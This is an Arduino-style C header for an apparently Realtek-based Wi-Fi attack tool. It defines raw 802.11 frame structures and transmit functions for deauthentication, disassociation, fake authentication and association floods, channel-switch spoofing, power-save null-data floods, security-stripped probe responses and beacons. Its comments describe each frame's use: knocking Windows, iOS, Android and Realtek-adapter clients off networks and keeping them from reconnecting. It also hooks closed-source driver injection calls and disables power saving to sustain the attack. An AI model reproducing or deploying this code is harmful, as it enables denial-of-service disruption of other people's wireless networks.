#ifndef WIFI_CUST_TX
#define WIFI_CUST_TX

#include <Arduino.h>

typedef struct {
  uint16_t frame_control = 0xC0;
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
} DeauthFrame;

typedef struct {
  uint16_t frame_control = 0xA0;
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x08;
} DisassocFrame;

/*
 * Authentication Request frame (0xB0)
 * NOT protected by PMF — sent before association.
 * Used to flood the AP's association table with fake client MACs.
 * When the table is full, legitimate clients (e.g. Windows) cannot re-associate.
 */
typedef struct {
  uint16_t frame_control  = 0x00B0;
  uint16_t duration       = 0x013A;
  uint8_t  destination[6];
  uint8_t  source[6];
  uint8_t  access_point[6];
  uint16_t sequence_number = 0;
  uint16_t auth_algorithm  = 0x0000; // Open System
  uint16_t auth_seq        = 0x0001; // Seq 1 = request
  uint16_t status_code     = 0x0000; // Success
} AuthReqFrame;

/*
 * Association Request frame (0x0000)
 * Sent after a fake auth to try to fully claim an association table slot.
 */
typedef struct {
  uint16_t frame_control    = 0x0000;
  uint16_t duration         = 0x013A;
  uint8_t  destination[6];
  uint8_t  source[6];
  uint8_t  access_point[6];
  uint16_t sequence_number  = 0;
  uint16_t capabilities     = 0x0431; // ESS, Short Preamble, Short Slot
  uint16_t listen_interval  = 0x000A;
  uint8_t  ssid_tag         = 0x00;   // SSID element (empty = match any)
  uint8_t  ssid_length      = 0x00;
} AssocReqFrame;

/*
 * Channel Switch Announcement Action frame (0x00D0)
 * Tricks 802.11 clients into switching to an invalid/unused channel.
 * Windows drivers often honor these even from unauthenticated sources.
 */
typedef struct {
  uint16_t frame_control   = 0x00D0;
  uint16_t duration        = 0xFFFF;
  uint8_t  destination[6];
  uint8_t  source[6];
  uint8_t  access_point[6];
  uint16_t sequence_number = 0;
  uint8_t  category        = 0x00; // Spectrum Management
  uint8_t  action          = 0x04; // Channel Switch Announcement
  uint8_t  csa_ie_tag      = 0x25; // IE ID 37
  uint8_t  csa_ie_len      = 0x03;
  uint8_t  csa_mode        = 0x01; // Mode 1: stop TX before switch
  uint8_t  new_channel;            // Set at runtime
  uint8_t  csa_count       = 0x01; // Switch in 1 beacon
} CSAFrame;

typedef struct {
  uint16_t frame_control = 0x80;
  uint16_t duration = 0;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  const uint64_t timestamp = 0;
  uint16_t beacon_interval = 0x64;
  uint16_t ap_capabilities = 0x21;
  const uint8_t ssid_tag = 0;
  uint8_t ssid_length = 0;
  uint8_t ssid[255];
} BeaconFrame;

/*
 * Null Data frame (type=Data, subtype=Null, ToDS=1, PM=1)
 * Frame Control = 0x1148:
 *   Bits 2-3: Type=10 (Data)
 *   Bits 4-7: Subtype=0100 (Null function, no payload)
 *   Bit  8:   ToDS=1 (STA→AP direction)
 *   Bit  12:  Power Management=1 (STA going to sleep)
 *
 * iOS attack: AP receives PM=1 → starts buffering all frames for that "client".
 * We flood from many fake MACs so the AP's power-save buffer fills up.
 * Even when iOS reconnects, the AP is too busy managing fake sleeping clients
 * to properly deliver frames — effectively cuts throughput mid-reconnect.
 */
typedef struct {
  uint16_t frame_control   = 0x1148;
  uint16_t duration        = 0x0000;
  uint8_t  destination[6];           // Addr1: AP BSSID
  uint8_t  source[6];                // Addr2: Spoofed client MAC
  uint8_t  access_point[6];          // Addr3: AP BSSID
  uint16_t sequence_number = 0;
} NullDataFrame;

/*
 * Probe Response frame (0x0050) with NO security capabilities.
 *
 * Realtek/TP-Link USB driver attack:
 *   Realtek drivers update their internal AP profile when they receive a probe
 *   response from a known BSSID. Sending a fake probe response with:
 *     - capabilities = 0x0001 (ESS only, no WPA/WPA2/WPA3 flags)
 *   makes the driver believe the AP suddenly dropped all security.
 *   The driver then disconnects and tries to re-negotiate — during which we keep
 *   sending deauth, making the adapter unable to complete reconnection.
 *
 * Also effective against:
 *   - Android: some Qualcomm/MediaTek drivers honour probe responses for roaming
 *   - iOS: confuses background scanning logic mid-reconnect
 */
typedef struct {
  uint16_t frame_control   = 0x0050; // Management, Probe Response
  uint16_t duration        = 0xFFFF;
  uint8_t  destination[6];           // broadcast
  uint8_t  source[6];                // AP BSSID (spoofed)
  uint8_t  access_point[6];          // AP BSSID
  uint16_t sequence_number = 0;
  uint64_t timestamp       = 0;
  uint16_t beacon_interval = 0x0064;
  uint16_t capabilities    = 0x0001; // ESS only — NO Privacy/WPA/RSN bits
  uint8_t  ssid_tag        = 0x00;
  uint8_t  ssid_length     = 0;
  uint8_t  ssid[32];                 // Filled at runtime; transmit only ssid_length bytes
} ProbeRespFrame;

/*
 * Realtek closed-source driver internals — frame injection
 */
extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

/*
 * Performance tuning — called once in setup() after WiFi.apbegin().
 * Disables IPS (Inactive Power Save) + LPS (Legacy Power Save) on the RF front-end.
 * Without this the driver throttles TX during perceived idle periods even when
 * FRAME_DELAY_MS = 0, causing invisible frame rate drops mid-attack.
 */
extern "C" int wifi_disable_powersave(void);

void wifi_tx_raw_frame(void* frame, size_t length);
void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason = 0x02);
void wifi_tx_disassoc_frame(void* src_mac, void* dst_mac, uint16_t reason = 0x08);
void wifi_tx_auth_frame(void* ap_mac, void* fake_client_mac);
void wifi_tx_assoc_frame(void* ap_mac, void* fake_client_mac);
void wifi_tx_csa_frame(void* ap_mac, uint8_t new_channel);
void wifi_tx_null_frame(void* ap_mac, void* fake_client_mac);
void wifi_tx_probe_resp_frame(void* ap_mac, const char* ssid);
void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char *ssid);

#endif
